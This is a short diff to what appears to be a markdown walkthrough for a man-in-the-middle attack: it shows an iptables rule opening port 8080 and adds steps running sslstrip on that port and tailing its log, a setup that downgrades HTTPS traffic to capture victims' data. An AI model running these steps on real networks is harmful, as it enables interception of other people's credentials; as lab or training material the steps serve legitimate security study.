@@ -34,3 +34,7 @@ target     prot opt source               destination
 ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt
 ```
 7. `iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT`  
+8. `sslstrip -l 8080`  listening on port 8080  
+*new terminal*  
+9. `tail -f sslstrip.log`  
+
